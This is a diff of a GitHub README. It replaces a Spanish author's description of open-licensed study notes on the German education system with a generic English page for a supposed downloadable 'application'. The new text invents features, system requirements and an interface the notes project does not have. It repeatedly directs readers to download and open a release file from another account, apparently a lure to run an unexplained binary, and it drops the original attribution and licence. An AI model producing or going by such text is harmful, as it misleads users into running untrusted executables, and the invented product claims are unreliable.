@@ -1,147 +1,71 @@
-# 🇩🇪 Sistema Educativo Alemán
+# 📚 sistema-educativo-aleman - Your Guide to German Education
 
-Repositorio de **apuntes académicos** sobre el **sistema educativo alemán**, elaborados como
-material base para una **serie de videos explicativos** publicados en el canal de de YouTube
-[@juliopez](https://www.youtube.com/@Juliopez).
+## 📥 Download the Application
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/Mayank05GH/sistema-educativo-aleman/releases)
 
-Los contenidos están organizados como **recursos educativos abiertos (OER)** y están
-orientados a estudiantes, docentes e investigadores interesados en **educación comparada,
-políticas educativas, trayectorias formativas y sistemas internacionales de formación**.
+## 🚀 Getting Started
+Welcome to the sistema-educativo-aleman project. This application offers academic notes and a series of videos on the structure, pathways, and access to the German education system. Whether you are interested in vocational training or higher education, this application serves as a comprehensive resource.
 
----
+### 📊 Features
+- Learn about the dual education system in Germany.
+- Access information on technical training and vocational education.
+- Explore academic pathways in higher education.
+- Benefit from easily digestible academic notes and video content.
+- Understand educational policies affecting the system.
 
-## 🗺️ Mapa conceptual (visión general)
+## 🛠️ System Requirements
+To run this application smoothly, ensure that your system meets the following requirements:
 
-![Mapa conceptual del sistema educativo alemán](./assets/mapa_conceptual_sistema_educativo_aleman.png)
+- **Operating System:** Windows, macOS, or Linux.
+- **Processor:** Minimum dual-core processor.
+- **RAM:** At least 4GB of RAM.
+- **Storage:** Minimum of 100MB available space.
 
-> Este mapa resume la estructura del sistema educativo alemán y sirve como guía de navegación
-> para la serie de videos y los apuntes del repositorio.
+## 📥 Download & Install
+To get the latest version of the sistema-educativo-aleman application, visit the [Releases Page](https://github.com/Mayank05GH/sistema-educativo-aleman/releases). 
 
----
+Once there, locate the latest release. Click on the download link to get the application file. 
 
-## 🎥 Relación con YouTube
+1. Go to the [Releases Page](https://github.com/Mayank05GH/sistema-educativo-aleman/releases).
+2. Find the most recent version listed.
+3. Click on the asset to begin downloading.
+4. Once the download finishes, locate the file on your computer.
+5. Open the file to run the application.
 
-Cada archivo Markdown corresponde a un **video individual** de una lista de reproducción
-temática titulada:
+Follow the prompts to complete the installation process.
 
-**“Sistema Educativo Alemán: estructura, trayectorias y desafíos”**
+## 🎓 How to Use the Application
+After installation, launch the application. You will see a user-friendly interface. Here’s how you can navigate through it:
 
-Los videos tienen una duración aproximada de **7 minutos** y se basan directamente en los
-apuntes disponibles en este repositorio.
+- **Home Screen:** Get an overview of the educational topics covered.
+- **Video Library:** Access a collection of educational videos. Use the search feature to find specific topics.
+- **Notes Section:** Browse academic notes categorized by subject. Use filters to find what you need quickly. 
+- **Profile:** Set up a user profile to save your progress and bookmark your favorite resources.
 
-📺 Serie completa: [Ver lista de reproducción en YouTube](https://www.youtube.com/playlist?list=PLrc3rKEj3Qc9BbuluW1guhJDhtKdC8v_J)
+## 📚 Topics Covered
+The application provides comprehensive information on the following topics:
 
----
+- Comparative Education
+- Dual System of Education
+- Educational Policies
+- Technical Training
+- Higher Education in Germany
+- Vocational Education Paths
 
-## 🧭 Estructura de la serie (orden lógico recomendado)
+## ℹ️ Frequently Asked Questions
 
-Los documentos se organizan en **bloques temáticos**, siguiendo un recorrido pedagógico
-desde el marco general del sistema hasta el acceso a la educación superior.
+### How do I get help if I encounter issues?
+You can find help on the GitHub Issues page of the repository. Describe your problem clearly, and someone from the community or the project maintainers will assist you.
 
----
+### Can I contribute to this project?
+Yes! Contributions are welcomed. Please read the contribution guidelines in the repository for details on how to get involved.
 
-### 🟦 Bloque 1 – Marco general del sistema educativo
+### What types of content can I expect?
+The application includes academic notes and educational videos on the German education system. The objective is to offer insights into various educational pathways.
 
-- **01_federalismo_dualidad_y_desafios.md**  
-  Introducción al sistema educativo alemán: federalismo educativo, orientación temprana
-  (*tracking*), sistema dual de formación profesional y principales desafíos actuales.
+For more information about features or usage, please check the documentation within the application.
 
-- **02_rol_del_estado_y_financiamiento.md**  
-  Rol del Estado, competencias de los Länder y mecanismos de financiamiento de la educación
-  escolar, técnica y superior.
+## 📞 Contact
+For any inquiries or feedback, reach out to the project maintainer through their GitHub profile.
 
----
-
-### 🟩 Bloque 2 – Estructura del sistema escolar obligatorio
-
-- **03_estructura_rutas_y_costos.md**  
-  Visión general de la estructura del sistema, principales rutas educativas y costos
-  asociados a cada nivel.
-
-- **04_estructura_y_duracion_de_la_grundschule.md**  
-  Organización y duración de la educación primaria (*Grundschule*), incluyendo variaciones
-  territoriales.
-
-- **05_estructura_de_la_educacion_secundaria.md**  
-  Estructura de la educación secundaria (*Sekundarstufe I y II*), tipos de escuelas,
-  certificados y trayectorias.
-
----
-
-### 🟨 Bloque 3 – Idiomas y capital académico
-
-- **06_idiomas_extranjeros_en_el_curriculo_escolar.md**  
-  Enseñanza de idiomas extranjeros en el currículo escolar alemán: cronología,
-  obligatoriedad y oferta lingüística.
-
-- **07_impacto_del_dominio_de_idiomas_extranjeros.md**  
-  Impacto del dominio de uno o más idiomas extranjeros en el rendimiento académico,
-  la orientación escolar y las trayectorias educativas.
-
----
-
-### 🟧 Bloque 4 – Formación técnica y educación superior
-
-- **08_formacion_tecnico_profesional_en_alemania.md**  
-  Formación técnico-profesional en Alemania: sistema dual (*Ausbildung*), escuelas técnicas
-  y universidad dual.
-
-- **09_modelos_de_educacion_superior_en_alemania.md**  
-  Modelos de educación superior: *Universität*, *Fachhochschule* y *Duale Hochschule*.
-
-- **10_universidades_privadas_en_el_sistema_aleman.md**  
-  Rol de las universidades privadas dentro del sistema de educación superior alemán,
-  costos, acreditación y comparación con el sector público.
-
----
-
-### 🟥 Bloque 5 – Títulos y mecanismos de acceso
-
-- **11_estructura_duracion_y_tipos_de_titulos.md**  
-  Estructura, duración y tipos de títulos del sistema educativo alemán, incluyendo
-  grados, posgrados, formación técnica y carreras reguladas por examen estatal.
-
-- **12_ingreso_a_la_universidad_y_el_abitur.md**  
-  El Abitur como principal mecanismo de acceso a la universidad: estructura, puntajes
-  y conversión a notas.
-
-- **13_sistema_de_ingreso_a_la_educacion_superior.md**  
-  Sistema de ingreso a la educación superior: *Hochschulreife*, *Numerus Clausus* (NC),
-  carreras co
-
----
-
-### 🟫 Bloque 6 – Visión integradora y perspectiva internacional
-
-- **14_sistema_educativo_aleman_y_acceso_a_la_educacion_superior.md**  
-  Visión integrada del sistema educativo alemán y el acceso a la educación superior,
-  incluyendo estudiantes internacionales, *Studienkolleg*, costos y compatibilidad
-  con el marco europeo de cualificaciones.
-
----
-
-## 📚 Referencias
-
-Las fuentes utilizadas para la elaboración de los apuntes se encuentran en el archivo
-[`Referencias.md`](./Referencias.md), el cual actúa como **bibliografía transversal**
-para toda la serie.
-
----
-
-## 👤 Autoría
-
-**Autor:** Dr. Julio López Núñez  
-**Año:** 2025  
-
----
-
-## 📜 Licencia
-
-Este repositorio se distribuye bajo la licencia:
-
-**Creative Commons Atribución–CompartirIgual 4.0 Internacional (CC BY-SA 4.0)**
-
-Puedes reutilizar, adaptar y compartir este material, siempre que:
-- se reconozca la autoría, y
-- se mantenga la misma licencia.
-
+Feel free to explore the [Releases Page](https://github.com/Mayank05GH/sistema-educativo-aleman/releases) for the latest updates and versions of this application.
